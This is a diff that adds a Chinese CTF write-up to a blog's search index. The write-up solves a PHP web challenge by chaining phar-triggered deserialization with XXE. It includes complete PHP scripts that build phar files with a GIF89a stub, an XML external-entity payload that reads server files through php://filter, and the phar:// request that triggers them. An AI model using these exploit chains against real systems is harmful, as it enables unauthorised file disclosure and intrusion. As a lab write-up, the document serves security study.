@@ -1,6 +1,218 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>长城杯Web WP</title>
+    <url>/2023/03/31/2023%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><span id="more"></span>
+<p>访问8000端口，题目给了源码：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">TheUse</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">,</span><span class="token variable">$con1</span><span class="token punctuation">,</span><span class="token variable">$con2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span> <span class="token operator">=</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span> <span class="token operator">=</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$new</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token punctuation">;</span>
+        <span class="token variable">$new</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">MyClass</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"String conversion.\n"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">,</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$param1</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getdir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">load</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>php反序列的知识不懂可以先看：<a href="https://blog.csdn.net/qq_64201116/article/details/127234204">https://blog.csdn.net/qq_64201116&#x2F;article&#x2F;details&#x2F;127234204</a><br>看到<code>**class的魔术方法**</code>第一时间想到反序列化<br>但是没有类似于<code>unserialize()</code>的反序列化函数<br>注意到函数<code>is_dir()</code>，这个函数可以触发<code>phar</code>协议，这个phar协议可以触发反序列化<br>phar反序列化知识补充：<a href="http://home.ustc.edu.cn/~xjyuan/blog/2019/11/13/phar-unserialize/">http://home.ustc.edu.cn/~xjyuan&#x2F;blog&#x2F;2019&#x2F;11&#x2F;13&#x2F;phar-unserialize&#x2F;</a><br>但是phar需要有文件上传的点：于是找到了<code>/upload.php</code>这个功能点<br>因此思路就有了：</p>
+<pre class="line-numbers language-info" data-language="info"><code class="language-info">通过链子构造phar文件，上传phar文件后用phar协议读取<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>反序列化的链子很简单：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">TheUse$__destruct() -->MyClass$__invoke-->MyClass$getdir()  //读取文件名称
+TheUse$__destruct() -->MyClass$__invoke-->MyClass$load()     //读取文件内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>构造反序列化链子：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">TheUse</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">,</span><span class="token variable">$con1</span><span class="token punctuation">,</span><span class="token variable">$con2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span> <span class="token operator">=</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span> <span class="token operator">=</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$new</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token punctuation">;</span>
+        <span class="token variable">$new</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">MyClass</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"String conversion.\n"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">,</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$param1</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getdir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">load</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$xml</span><span class="token operator">=</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span>
+<span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string double-quoted-string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string double-quoted-string">"utf-8"</span><span class="token delimiter important">?></span></span> 
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span><span class="token punctuation">[</span><span class="token internal-subset">
+&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/flag.php"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span>
+EOF;
+$payload = new TheUse(new MyClass('./'), 'load', $xml);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="坑点1"><a href="#坑点1" class="headerlink" title="坑点1"></a>坑点1</h2><p>构造函数的时候<code>$xml</code>变量要用</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">$xml=&lt;&lt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>EOF</span>
+<span class="token attr-name">&lt;?xml</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span> <span class="token attr-name">encoding</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token attr-name">?</span><span class="token punctuation">></span></span> 
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span><span class="token punctuation">[</span><span class="token internal-subset">
+&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=./flag.php"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span>
+EOF;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这种形式定义，不能直接放到构造函数里，我就是死在这</p>
+<h2 id="坑点2"><a href="#坑点2" class="headerlink" title="坑点2"></a>坑点2</h2><p>在xml中读取文件时要用绝对路径读取协议(这里用了php伪协议读取文件:  php filter读文件知识补充<a href="https://blog.csdn.net/qq_64201116/article/details/125926612">https://blog.csdn.net/qq_64201116&#x2F;article&#x2F;details&#x2F;125926612</a>)：</p>
+<p>不用绝对路径的报错图：</p>
+<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/1.png"></p>
+<p>解决方法(使用绝对路径)：</p>
+<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/2.png"></p>
+<h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><p>payload生成读取文件名的phar文件：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">TheUse</span><span class="token punctuation">&#123;</span>
+     <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+     <span class="token keyword">private</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
+     <span class="token keyword">private</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
+     <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">,</span><span class="token variable">$con1</span><span class="token punctuation">,</span><span class="token variable">$con2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span> <span class="token operator">=</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span> <span class="token operator">=</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> 
+     <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+         <span class="token variable">$new</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token punctuation">;</span>
+         <span class="token variable">$new</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>
+ <span class="token punctuation">&#125;</span>
+ <span class="token keyword">class</span> <span class="token class-name-definition class-name">MyClass</span><span class="token punctuation">&#123;</span>
+     <span class="token keyword">private</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
+     <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> 
+     <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+         <span class="token keyword">echo</span> <span class="token string double-quoted-string">"String conversion.\n"</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>
+     <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">,</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+         <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$param1</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>
+     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">getdir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+         <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>
+     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">load</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+         <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>
+ <span class="token punctuation">&#125;</span>
+
+
+<span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TheUse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/var/www/html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getdir'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/var/www/html/*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GIF89a'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// phar:[phar.phar][system_get_you_filename]/1.txt</span>
+<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>运行后上传phar文件<br>然后使用phar协议读取：</p>
+<pre class="line-numbers language-info" data-language="info"><code class="language-info">?f&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;phar.phar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/3.png"></p>
+<p>可以看到flag的名称是<code>Maybe_flag_is_here.php</code><br>接下来读取flag：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">TheUse</span><span class="token punctuation">&#123;</span>
+     <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+     <span class="token keyword">private</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
+     <span class="token keyword">private</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
+     <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">,</span><span class="token variable">$con1</span><span class="token punctuation">,</span><span class="token variable">$con2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span> <span class="token operator">=</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span> <span class="token operator">=</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> 
+     <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+         <span class="token variable">$new</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token punctuation">;</span>
+         <span class="token variable">$new</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>
+ <span class="token punctuation">&#125;</span>
+ <span class="token keyword">class</span> <span class="token class-name-definition class-name">MyClass</span><span class="token punctuation">&#123;</span>
+     <span class="token keyword">private</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
+     <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> 
+     <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+         <span class="token keyword">echo</span> <span class="token string double-quoted-string">"String conversion.\n"</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>
+     <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">,</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+         <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$param1</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>
+     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">getdir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+         <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>
+     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">load</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+         <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>
+ <span class="token punctuation">&#125;</span>
+
+
+<span class="token variable">$xml</span><span class="token operator">=</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span>
+<span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string double-quoted-string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string double-quoted-string">"utf-8"</span><span class="token delimiter important">?></span></span> 
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span><span class="token punctuation">[</span><span class="token internal-subset">
+&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/Maybe_flag_is_here.php"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span>
+EOF;
+$payload = new TheUse(new MyClass('/var/www/html'), 'load', $xml);
+$phar = new Phar('phar.phar');
+$phar->startBuffering();
+$phar->setStub('GIF89a'.'<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">__HALT_COMPILER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>');
+$phar->setMetadata($payload);
+$phar->addFromString('1.txt','test'); // phar:[phar.phar][system_get_you_filename]/1.txt
+$phar->stopBuffering();
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>依旧是把生成的phar文件上传,使用phar协议反序列化：</p>
+<pre class="line-numbers language-info" data-language="info"><code class="language-info">?f&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;phar.phar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/4.png"></p>
+<p>解码得到flag:<br><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/5.png"></p>
+<p>flag:<code>flag&#123;this-is-flag-for-you&#125;</code></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+  </entry>
+  <entry>
     <title>2021 蓝帽杯 One Pointer PHP</title>
     <url>/2022/08/31/2021_%E8%93%9D%E5%B8%BD%E6%9D%AFOne%20Pointer%20PHP/</url>
     <content><![CDATA[<h1 id="2021-蓝帽杯-One-Pointer-PHP"><a href="#2021-蓝帽杯-One-Pointer-PHP" class="headerlink" title="[2021 蓝帽杯] One Pointer PHP"></a>[2021 蓝帽杯] One Pointer PHP</h1><h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><h3 id="1-php数组溢出"><a href="#1-php数组溢出" class="headerlink" title="1.php数组溢出"></a>1.php数组溢出</h3><pre class="line-numbers language-info" data-language="info"><code class="language-info">32位系统 最大整数  &#x3D;&gt; 231 &#x3D;&gt; 2,147,483,648 - 1 &#x3D;&gt; 2,147,483,647<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -522,218 +734,6 @@ conn<span class="token operator">.</span><span class="token function">close</spa
